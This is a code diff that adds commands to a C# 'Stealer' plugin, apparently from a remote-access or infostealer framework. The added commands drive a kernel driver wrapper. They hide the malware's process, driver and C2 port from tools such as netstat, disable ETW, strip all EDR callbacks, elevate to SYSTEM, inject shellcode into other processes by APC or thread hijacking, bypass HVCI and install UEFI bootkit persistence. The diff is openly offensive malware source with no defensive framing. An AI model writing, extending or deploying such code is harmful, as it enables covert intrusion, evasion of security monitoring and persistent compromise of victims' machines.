@@ -445,9 +445,142 @@ public sealed class Stealer : IUniversalPlugin
           }
           return new PluginResult() { Success = success, Message = output };
 
+        // ═══════════════════════════════════════════════════════════════════════════
+        // 🔥 SHADOW WRAPPER CONVENIENCE COMMANDS
+        // ═══════════════════════════════════════════════════════════════════════════
+
+        case "shadow_fullstealth":
+          // Combined: Hide process + Hide driver + Disable ETW
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
+              success = shadow.ActivateFullStealth(pid);
+              output = success ? "🔥 FULL STEALTH ACTIVATED! Process hidden, driver hidden, ETW disabled." 
+                               : "Partial stealth - some operations may have failed.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_ghost":
+          // Combined: Elevate to SYSTEM + Hide process
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
+              success = shadow.BecomeGhost(pid);
+              output = success ? "👻 GHOST MODE! Elevated to SYSTEM and hidden from all tools."
+                               : "Ghost mode partial - check kernel driver status.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_nuke_edr":
+          // Remove ALL EDR callbacks + disable ETW
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              success = shadow.NukeEdr();
+              output = success ? "💀 EDR NUKED! All security callbacks removed, ETW disabled."
+                               : "EDR nuke partial - some callbacks may remain.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_hide_c2port":
+          // Hide C2 connection port: args = port number
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              if (ushort.TryParse(args, out ushort port))
+              {
+                success = shadow.HideC2Port(port);
+                output = success ? $"🌐 Port {port} is now INVISIBLE to netstat and all tools!"
+                                 : $"Failed to hide port {port}.";
+              }
+              else { output = "Invalid port. Usage: shadow_hide_c2port|443"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_inject_apc":
+          // Stealth injection via APC: args = pid|shellcodePath
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              var parts = args?.Split('|');
+              if (parts != null && parts.Length >= 2 && int.TryParse(parts[0], out int targetPid))
+              {
+                success = shadow.InjectShellcodeApc(targetPid, parts[1]);
+                output = success ? $"💉 Shellcode injected into PID {targetPid} via APC!"
+                                 : $"Injection failed for PID {targetPid}.";
+              }
+              else { output = "Invalid args. Usage: shadow_inject_apc|1234|C:\\shell.bin"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_inject_hijack":
+          // Stealthiest injection via thread hijacking: args = pid|shellcodePath
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              var parts = args?.Split('|');
+              if (parts != null && parts.Length >= 2 && int.TryParse(parts[0], out int targetPid))
+              {
+                success = shadow.InjectShellcodeHijack(targetPid, parts[1]);
+                output = success ? $"👻 Thread hijacked in PID {targetPid}! Shellcode executing."
+                                 : $"Thread hijack failed for PID {targetPid}.";
+              }
+              else { output = "Invalid args. Usage: shadow_inject_hijack|1234|C:\\shell.bin"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_bypass_hvci":
+          // HVCI bypass for unsigned code execution
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              success = shadow.BypassHVCI();
+              output = success ? "⚡ HVCI BYPASSED! Hypervisor code integrity disabled."
+                               : "HVCI bypass failed - may require specific hardware.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "shadow_uefi_persist":
+          // Install UEFI bootkit persistence
+          using (var shadow = new ShadowWrapper())
+          {
+            if (shadow.Connect())
+            {
+              success = shadow.InstallUefiPersistence();
+              output = success ? "🔒 UEFI PERSISTENCE INSTALLED! Will survive OS reinstall."
+                               : "UEFI persistence failed - may require Secure Boot disabled.";
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
         default:
           return new PluginResult() { Success = false, Message = "Unknown command" };
       }
+
     }
     catch (Exception ex)
     {
